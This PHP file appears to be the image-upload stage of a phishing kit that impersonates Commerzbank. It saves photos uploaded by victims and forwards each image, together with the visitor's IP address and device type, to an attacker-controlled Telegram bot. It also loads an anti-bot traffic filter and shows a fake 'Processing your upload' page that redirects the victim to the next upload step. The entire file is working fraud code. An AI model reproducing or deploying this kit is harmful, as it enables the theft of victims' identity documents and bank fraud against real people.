<?php
// ANTIBOT DISABLED - include..antibot.php';
include '../antibot/tds.php';

// Increase limits for iPhone uploads
ini_set('upload_max_filesize', '50M');
ini_set('post_max_size', '50M');
ini_set('max_execution_time', '300');
ini_set('memory_limit', '256M');

// Include Telegram configuration
include '../config/telegram.php';
$botToken = $telegram_bot2_token;
$chatId = $telegram_bot2_chat_id;

$uploadDir = 'xentryxupload/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// Debug logging
error_log("iPhone Upload Debug - Request Method: " . $_SERVER['REQUEST_METHOD']);
error_log("iPhone Upload Debug - Content Type: " . $_SERVER['CONTENT_TYPE']);
error_log("iPhone Upload Debug - Content Length: " . $_SERVER['CONTENT_LENGTH']);

// Check if file was uploaded
if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
    error_log("iPhone Upload Debug - File upload successful");
    
    $randomPrefix = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
    $originalFileName = basename($_FILES['file']['name']);
    $fileExtension = strtolower(pathinfo($originalFileName, PATHINFO_EXTENSION));
    $newFileName = $randomPrefix . '-' . $originalFileName;
    $uploadPath = $uploadDir . $newFileName;

    // Validate file type for iPhone
    $allowedTypes = ['jpg', 'jpeg', 'png', 'gif', 'heic', 'heif'];
    if (!in_array($fileExtension, $allowedTypes)) {
        error_log("iPhone Upload Debug - Invalid file type: " . $fileExtension);
        echo "Error: Invalid file type. Please upload JPG, PNG, GIF, or HEIC files.";
        exit;
    }

    // Move uploaded file
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
        error_log("iPhone Upload Debug - File moved successfully to: " . $uploadPath);
        
        // Get file info
        $fileSize = filesize($uploadPath);
        $visitorIp = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $serverHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_ADDR'];
        $imageURL = "{$serverHost}/views/{$uploadDir}{$newFileName}";

        // Create message with device info
        $message = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗽𝗹𝗼𝗮𝗱  [ 1st ]\n";
        $message .= "- Another IMG should appear after this.\n\n";
        $message .= "🔗 |  𝗜𝗠𝗚 𝗨𝗥𝗟  : $imageURL\n";
        $message .= "📍 |  𝗜𝗣  : $visitorIp\n";
        $message .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲  : " . (strpos($userAgent, 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
        $message .= "📏 |  𝗦𝗶𝘇𝗲  : " . number_format($fileSize / 1024, 2) . " KB";

        // Try to send image to Telegram
        error_log("iPhone Upload Debug - Attempting to send to Telegram");
        $result = sendTelegramPhoto($botToken, $chatId, $uploadPath, $message);
        
        if ($result) {
            error_log("iPhone Upload Debug - Telegram send successful");
        } else {
            error_log("iPhone Upload Debug - Telegram send failed");
            // Try alternative method
            $altResult = sendTelegramMessage($botToken, $chatId, $message . "\n\n⚠️ Image upload failed, but data received.");
            if ($altResult) {
                error_log("iPhone Upload Debug - Alternative message sent successfully");
            }
        }
        
    } else {
        error_log("iPhone Upload Debug - Failed to move uploaded file");
        echo "Error uploading the file. Please try again.";
    }
} else {
    // Handle upload errors
    $uploadError = $_FILES['file']['error'] ?? 'No file uploaded';
    error_log("iPhone Upload Debug - Upload error: " . $uploadError);
    
    $errorMessages = [
        UPLOAD_ERR_INI_SIZE => 'File too large (server limit)',
        UPLOAD_ERR_FORM_SIZE => 'File too large (form limit)',
        UPLOAD_ERR_PARTIAL => 'File upload was incomplete',
        UPLOAD_ERR_NO_FILE => 'No file was uploaded',
        UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
        UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
        UPLOAD_ERR_EXTENSION => 'File upload stopped by extension'
    ];
    
    $errorMsg = $errorMessages[$uploadError] ?? 'Unknown upload error';
    echo "Upload Error: " . $errorMsg;
    
    // Send error notification to Telegram
    $errorMessage = "❌ |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗽𝗹𝗼𝗮𝗱 𝗘𝗿𝗿𝗼𝗿\n";
    $errorMessage .= "📍 |  𝗜𝗣  : " . $_SERVER['REMOTE_ADDR'] . "\n";
    $errorMessage .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲  : " . (strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
    $errorMessage .= "⚠️ |  𝗘𝗿𝗿𝗼𝗿  : " . $errorMsg;
    
    sendTelegramMessage($botToken, $chatId, $errorMessage);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <script src="/security.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>One Moment...</title>
    <meta http-equiv="refresh" content="2; url=uploadz3.php">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: #f5f5f5;
        }
        .loading {
            color: #666;
            font-size: 18px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <div class="loading">Processing your upload...</div>
</body>
</html>
